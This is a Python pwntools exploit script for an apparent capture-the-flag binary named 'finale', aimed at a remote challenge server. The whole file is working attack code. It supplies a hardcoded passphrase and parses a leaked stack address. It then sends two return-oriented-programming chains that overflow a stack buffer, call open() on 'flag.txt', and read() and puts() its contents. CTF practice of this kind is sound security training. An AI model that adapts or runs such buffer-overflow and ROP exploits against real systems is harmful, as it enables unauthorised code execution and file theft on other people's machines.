#!/usr/bin/env python3
from pwn import *

# Direct ROP exploit using open/read/puts to read flag.txt on remote custom libc
exe = context.binary = ELF("finale")
context.log_level = "debug"

def main():
    # connect remote
    r = remote("83.136.248.49", 31969)

    # 1) send secret phrase
    r.sendlineafter(b"phrase: ", b"s34s0nf1n4l3b00")

    # 2) leak stack buffer address
    r.recvuntil(b"luck: [")
    buf = int(r.recvuntil(b"]", drop=True), 16)
    log.info(f"buf = {hex(buf)}")

    # 3) stage 1: write "flag.txt" into buf, open() it, then re-enter finale()
    rop = ROP(exe)
    rop.raw(b"flag.txt\x00")
    # pad to overwrite saved RBP
    rop.raw(b"A" * (64 - len(b"flag.txt\x00") + 8))
    rop.call(exe.plt["open"], [buf, 0])
    rop.call(exe.symbols["finale"])
    r.sendlineafter(b"year: ", rop.chain())

    # 4) stage 2: read from FD=5 into .bss and puts() it
    bss = exe.bss() + 0x20
    rop2 = ROP(exe)
    rop2.raw(b"A" * 72)
    pop_rdi = rop2.find_gadget(["pop rdi","ret"])[0]
    pop_rsi_r15 = rop2.find_gadget(["pop rsi","pop r15","ret"])[0]
    # set FD = 5 (remote open returns FD 5)
    rop2.raw(p64(pop_rdi));    rop2.raw(p64(5))
    # set buffer ptr
    rop2.raw(p64(pop_rsi_r15)); rop2.raw(p64(bss)); rop2.raw(p64(0))
    # call read@plt (len arg still 0x1000 from finale's read)
    rop2.raw(p64(exe.plt["read"]))
    # puts(bss)
    rop2.raw(p64(pop_rdi));    rop2.raw(p64(bss))
    rop2.raw(p64(exe.plt["puts"]))

    r.sendlineafter(b"year: ", rop2.chain())

    # interactive: flag will be printed
    r.interactive()

if __name__ == "__main__":
    main()
